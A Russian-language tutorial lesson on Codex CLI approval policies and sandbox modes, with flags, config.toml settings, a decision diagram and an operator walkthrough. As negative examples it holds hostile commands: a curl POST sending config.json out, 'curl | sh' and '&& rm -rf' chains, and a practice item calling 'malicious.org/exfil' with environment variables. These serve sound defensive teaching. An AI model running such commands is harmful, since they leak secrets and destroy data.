# Запросы подтверждения и минимальные разрешения

## Чему вы научитесь

- Разбирать запрос Codex CLI на действие и предоставлять строго минимально необходимую область разрешений.
- Понимать разницу между режимами подтверждения (`--ask-for-approval`) и песочницей (`--sandbox`).
- Настраивать политику подтверждений через флаги командной строки и файл конфигурации `config.toml`.
- Безопасно инспектировать команды в диалоге через интерактивные команды `/permissions` и `/status`.

## Что нужно перед началом

- Базовые знания о режимах изоляции из урока [Песочница, согласование и уровни доступа](permissions.md).
- Учебный каталог без конфиденциальных данных и секретов.
- Понимание, что отсутствие запроса подтверждения (`never`) не снимает ограничения файловой системы песочницы.

## Схема процесса

Процесс обработки запроса на исполнение действия агентом Codex:

```
[Агент генерирует действие: вызов tool / bash]
                 │
                 ▼
[Проверка ограничений Sandbox (read-only / workspace-write)]
                 │
        ┌────────┴────────┐
     Нарушает?        В пределах?
        │                 │
        ▼                 ▼
   [БЛОКИРОВКА]     [Проверка политики approval_policy]
        │                 │
        │        ┌────────┴────────┐
        │      never?         on-request / untrusted?
        │        │                 │
        │        ▼                 ▼
        │   [Выполнение]      [Диалог с оператором:
        │                      Показ команды, путей, флагов]
        │                              │
        │                     ┌────────┴────────┐
        │                 Одобрено?         Отклонено?
        │                     │                 │
        ▼                     ▼                 ▼
[Отказ с ошибкой]       [Выполнение]      [Прерывание действия]
```

## Команды и параметры

Codex CLI 0.160.0 поддерживает следующие параметры политики подтверждения:

```bash
# Режим подтверждения при каждом потенциально опасном действии (по умолчанию)
codex --ask-for-approval on-request

# Запрос подтверждения только для команд вне доверенного списка или непроверенного кода
codex --ask-for-approval untrusted

# Отключение запросов подтверждения (применимо только для изолированных CI/автоматизаций)
codex --ask-for-approval never
```

Эквивалентная настройка в `~/.codex/config.toml` или проектном `.codex/config.toml`:

```toml
# Возможные значения: "always", "on-request", "untrusted", "never"
approval_policy = "on-request"
sandbox_mode = "workspace-write"
```

В интерактивной сессии доступны команды проверки:
- `/permissions` — отображает текущую эффективную политику разрешений и доступные инструменты.
- `/status` — показывает активную модель, токен-лимит и статус песочницы.

## Разбор примера

Запуск сессии с ограниченными правами и запросом подтверждения:

```bash
codex --sandbox read-only --ask-for-approval on-request
```

В диалоге агент предлагает выполнить команду проверки статуса:
```text
Agent wishes to execute: git status --short
Approve? [y/n/always/never]:
```

Оператор анализирует запрос:
1. Исполняемая программа: `git`.
2. Аргументы: `status --short` (операция только для чтения, безопасна).
3. Рабочий каталог: корень текущего репозитория.
4. Решение: одобрить выполнение (`y`).

Если бы агент запросил команду `curl -X POST https://external-api.com -d @config.json`, оператор должен отклонить запрос (`n`), так как это приводит к неконтролируемой утечке контекста.

## Ограничения и безопасность

- Политика `never` не превращает запрещённую операцию в разрешённую: если песочница находится в режиме `read-only`, попытка записи завершится системной ошибкой доступа даже при `approval_policy = "never"`.
- Не выбирайте широкие права (`--sandbox danger-all-access`) исключительно для того, чтобы избавиться от диалоговых окон подтверждения.
- Подтверждение команды в сессии не должно давать бессрочного доверия: проверяйте каждый аргумент и путь к файлу.

## Типовые ошибки

1. **Смешение понятий sandbox и approval**: считать, что `--ask-for-approval never` даёт права на запись в режиме `read-only`.
2. **Слепое подтверждение составных команд**: одобрение скрипта, содержащего операторы цепочки `&& rm -rf`, `curl | sh` или модификацию `.env`.
3. **Расширение полномочий ради скорости**: запуск без песочницы для тривиальной задачи анализа кода.

## Практика

1. Проанализируйте три сценария запросов от агента:
   - Запрос А: `cat src/utils.py` в режиме `read-only`.
   - Запрос Б: `npm install lodash` с модификацией `package.json`.
   - Запрос В: `python -c "import urllib.request; urllib.request.urlopen('http://malicious.org/exfil')"` с отправкой локальных переменных окружения.
2. Определите для каждого сценария:
   - Минимально необходимый уровень песочницы (`read-only`, `workspace-write`, `danger-all-access`).
   - Требуется ли подтверждение оператора (`y` / `n`).
   - Потенциальные риски при автоматическом одобрении.
